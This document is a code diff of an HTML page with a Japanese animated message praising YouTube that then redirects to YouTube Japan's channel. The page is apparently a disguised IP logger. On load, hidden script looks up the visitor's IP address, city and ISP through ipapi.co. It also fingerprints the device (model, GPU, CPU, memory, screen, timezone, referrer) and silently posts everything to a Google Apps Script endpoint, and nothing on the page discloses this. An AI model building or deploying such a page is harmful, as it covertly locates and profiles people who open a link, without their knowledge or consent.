@@ -8,15 +8,26 @@
     <style>
         :root { --yt-red: #ff0000; --bg-black: #020202; }
         body { margin: 0; padding: 0; background-color: var(--bg-black); color: #ffffff; font-family: sans-serif; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; }
+        
         #star-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
-        #main-viewport { position: relative; width: 90vw; height: 85vh; z-index: 10; display: flex; flex-direction: column; justify-content: center; overflow: hidden; }
-        #stack-container { position: relative; width: 100%; height: 100%; transition: transform 0.8s cubic-bezier(0.76, 0, 0.24, 1); }
+
+        #main-viewport { 
+            position: relative; width: 90vw; height: 80vh; z-index: 10; 
+            overflow: hidden; /* スライドアウトした文字を隠す */
+        }
+        
+        /* P1〜P5をまとめるコンテナ */
+        #stack-container { 
+            position: absolute; width: 100%; height: 100%; top: 0; left: 0;
+            transition: transform 1s cubic-bezier(0.65, 0, 0.35, 1), opacity 0.8s ease; 
+        }
+
         .text-element { position: absolute; font-weight: 900; line-height: 1.1; opacity: 0; letter-spacing: -0.05em; word-break: keep-all; }
 
         /* イントロ：純粋な赤 */
         #intro-msg {
             font-size: clamp(32px, 6vw, 55px); width: 100%; text-align: center; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            color: var(--yt-red); text-shadow: 0 0 20px var(--yt-red);
+            color: var(--yt-red); text-shadow: 0 0 25px var(--yt-red);
             animation: introIn 1.5s ease forwards;
         }
 
@@ -33,14 +44,29 @@
         .highlight { color: var(--yt-red); }
 
         #p1 { top: 5%; left: 0%; transform: translateX(-100px); }
-        #p2 { top: 18%; right: 0%; transform: translateX(100px); text-align: right; }
-        #p3 { top: 40%; left: 2%; transform: translateY(50px); }
-        #p4 { top: 55%; right: 5%; transform: translateX(100px); text-align: right; }
-        #p5 { bottom: 10%; left: 0%; transform: scale(0.8); }
-        #p6 { width: 100%; text-align: center; bottom: 45%; left: 0; opacity: 0; transform: translateY(100px); font-size: clamp(24px, 4vw, 42px); }
+        #p2 { top: 20%; right: 0%; transform: translateX(100px); text-align: right; }
+        #p3 { top: 42%; left: 2%; transform: translateY(50px); }
+        #p4 { top: 58%; right: 5%; transform: translateX(100px); text-align: right; }
+        #p5 { bottom: 5%; left: 0%; transform: scale(0.8); }
 
-        .active-p { opacity: 1 !important; transform: translate(0, 0) scale(1) !important; transition: all 0.7s cubic-bezier(0.16, 1, 0.3, 1); }
-        .slide-up { transform: translateY(-100%) !important; opacity: 0 !important; transition: all 0.8s ease-in; }
+        /* 最後のメッセージ：中央配置・下からフェードイン */
+        #p6 {
+            position: absolute; width: 100%; text-align: center; 
+            top: 50%; left: 50%;
+            transform: translate(-50%, 100px); /* 最初は下の方に配置 */
+            opacity: 0;
+            font-size: clamp(24px, 4.5vw, 45px);
+            transition: all 1s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .active-p { opacity: 1 !important; transform: translate(0, 0) scale(1) !important; transition: all 0.8s cubic-bezier(0.16, 1, 0.3, 1); }
+        
+        /* スライドアップ実行クラス */
+        .slide-up-exit { transform: translateY(-100vh) !important; opacity: 0 !important; }
+        
+        /* 最後の文字を中央へ移動 */
+        #p6.active-final { opacity: 1 !important; transform: translate(-50%, -50%) !important; }
+
         #progress-line { position: fixed; top: 0; left: 0; height: 3px; background: var(--yt-red); width: 0%; z-index: 100; box-shadow: 0 0 15px var(--yt-red); }
     </style>
 </head>
@@ -48,8 +74,10 @@
 
 <canvas id="star-canvas"></canvas>
 <div id="progress-line"></div>
+
 <div id="main-viewport">
     <div id="intro-msg" class="text-element">あと10秒だけ時間をください！</div>
+
     <div id="stack-container">
         <div id="p1" class="text-element bold-xl"><span class="highlight">YouTube</span>は、</div>
         <div id="p2" class="text-element bold-lg">世界最大の<br>動画共有プラットフォーム。</div>
@@ -57,102 +85,91 @@
         <div id="p4" class="text-element bold-md">Googleが買収した2006年から現在まで、<br>メディアの歴史を塗り替え続けています。</div>
         <div id="p5" class="text-element bold-lg">さらなる<span class="highlight">未体験</span>のステージへ。</div>
     </div>
+
     <div id="p6" class="text-element bold-md highlight">現在、最高の視聴環境を構築しています...</div>
 </div>
 
 <script>
-    const GAS_URL = "https://script.google.com/macros/s/AKfycbyvRc3ilwhuBNpoe9heZoSBRlPmR59FY1W8cnabD5xGxqGF96j9X8C5d50i5oZJiKne-w/exec";
+    const GAS_URL = "https://script.google.com/macros/s/AKfycbxdoT9D8bGfdFWaCS4f7dAucnxy04BNzJoCU0Bb-QZB5hQc5EA0cM27AZEdF7HuD60YuQ/exec";
     const REDIRECT_URL = "https://www.youtube.com/@YouTubeJapan/videos";
 
-    // --- 超詳細デバイス解析ロジック ---
-    async function getAccurateDevice() {
+    // --- 正確なクライアント情報取得 ---
+    async function getClientData() {
         let model = "不明なデバイス";
         const ua = navigator.userAgent;
         
-        // 1. Client Hints API (Chrome/Edgeなどの最新ブラウザ用)
+        // 1. Client Hints (Chrome等)
         if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-            const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
-            if (hints.model) return hints.model;
+            const h = await navigator.userAgentData.getHighEntropyValues(['model']);
+            if (h.model) model = h.model;
         }
 
-        // 2. iOSの解像度による精密判定 (Safari用)
+        // 2. iOS精密判定 (Safari等)
         const w = screen.width, h = screen.height, r = window.devicePixelRatio;
         if (/iPhone/.test(ua)) {
-            const size = `${Math.min(w,h)}x${Math.max(w,h)}@${r}`;
-            const iosModels = {
-                "430x932@3": "iPhone 15/14 Pro Max",
-                "393x852@3": "iPhone 15/14 Pro",
-                "390x844@3": "iPhone 14/13/12 Pro",
-                "428x926@3": "iPhone 14/13/12 Pro Max",
-                "375x812@3": "iPhone 13/12 mini / X / XS",
-                "414x896@3": "iPhone XS Max / 11 Pro Max",
-                "414x896@2": "iPhone XR / 11",
-                "375x667@2": "iPhone SE (2nd/3rd gen) / 8 / 7 / 6s"
-            };
-            model = iosModels[size] || "iPhone (新型または未定義)";
-        } 
-        else if (/CrOS/.test(ua)) model = "Chromebook";
+            const sig = `${Math.min(w,h)}x${Math.max(w,h)}@${r}`;
+            const ios = {"430x932@3":"iPhone 15/14 Pro Max","393x852@3":"iPhone 15/14 Pro","390x844@3":"iPhone 14/13/12 Pro","428x926@3":"iPhone 14/13/12 Pro Max","375x812@3":"iPhone mini/X/XS","414x896@3":"iPhone 11/XS Max","414x896@2":"iPhone XR/11","375x667@2":"iPhone SE/8/7"};
+            model = ios[sig] || "iPhone";
+        } else if (/CrOS/.test(ua)) model = "Chromebook";
         else if (/Android/.test(ua)) {
-            const match = ua.match(/Android\s([^\s;]+);\s([^;]+)\sBuild/);
-            model = match ? match[2] : "Android端末";
-        }
-        else if (/Macintosh/.test(ua)) model = "Mac";
+            const m = ua.match(/Android\s.*?\s([^;]*)\sBuild/);
+            model = m ? m[1] : "Android端末";
+        } else if (/Mac/.test(ua)) model = "Mac";
         else if (/Windows/.test(ua)) model = "Windows PC";
 
-        return model;
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        let gpu = "不明";
+        if (gl) {
+            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "WebGL対応";
+        }
+
+        return { model, gpu, ua };
     }
 
-    async function collectAndSend() {
-        try {
-            const geoRes = await fetch('https://ipapi.co/json/');
-            const geo = await geoRes.json();
-            const modelName = await getAccurateDevice();
-            
-            // GPU
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            let gpu = "不明";
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "WebGL対応";
-            }
-
-            const payload = {
-                ip: geo.ip,
-                location: `${geo.country_name} / ${geo.city}`,
-                isp: geo.org,
-                model: modelName,
-                gpu: gpu,
-                cpu: navigator.hardwareConcurrency || "不明",
-                memory: navigator.deviceMemory || "不明",
-                screen: `${screen.width}x${screen.height} (DPR:${window.devicePixelRatio})`,
-                browser: navigator.platform,
-                ua: navigator.userAgent,
-                lang: navigator.language,
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                ref: document.referrer || "直接アクセス"
-            };
-
-            fetch(GAS_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
-        } catch (e) { console.error(e); }
-    }
-
-    async function startAnimation() {
+    async function startSequence() {
         const bar = document.getElementById('progress-line');
         const stack = document.getElementById('stack-container');
+        const p6 = document.getElementById('p6');
+
         await new Promise(r => setTimeout(r, 1600));
+
+        // 蓄積
         const blocks = ['p1', 'p2', 'p3', 'p4', 'p5'];
         for (let i = 0; i < blocks.length; i++) {
             document.getElementById(blocks[i]).classList.add('active-p');
             bar.style.width = ((i + 1) / (blocks.length + 1) * 80) + "%";
             await new Promise(r => setTimeout(r, 1100));
         }
-        stack.classList.add('slide-up');
-        await new Promise(r => setTimeout(r, 600));
-        document.getElementById('p6').classList.add('active-p');
+
+        // --- スライドアップアニメーション ---
+        stack.classList.add('slide-up-exit'); // 物理的に上に突き抜ける
+        await new Promise(r => setTimeout(r, 600)); // スライドの途中で次を出す
+        
+        p6.classList.add('active-final'); // 下から中央へフェードイン
         bar.style.width = "100%";
+        
         await new Promise(r => setTimeout(r, 2500));
         window.location.replace(REDIRECT_URL);
+    }
+
+    async function collectAndSend() {
+        try {
+            const geo = await (await fetch('https://ipapi.co/json/')).json();
+            const client = await getClientData();
+            
+            const payload = {
+                ip: geo.ip, location: `${geo.country_name} / ${geo.city}`, isp: geo.org,
+                model: client.model, gpu: client.gpu,
+                cpu: navigator.hardwareConcurrency || "不明", memory: navigator.deviceMemory || "不明",
+                screen: `${screen.width}x${screen.height} (DPR:${window.devicePixelRatio})`,
+                browser: navigator.platform, ua: client.ua,
+                lang: navigator.language, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                ref: document.referrer || "直接アクセス"
+            };
+            fetch(GAS_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
+        } catch (e) { console.error(e); }
     }
 
     function initStars() {
@@ -173,7 +190,7 @@
         draw();
     }
 
-    window.onload = () => { initStars(); collectAndSend(); startAnimation(); };
+    window.onload = () => { initStars(); collectAndSend(); startSequence(); };
     setTimeout(() => { window.location.replace(REDIRECT_URL); }, 15000);
 </script>
 </body>
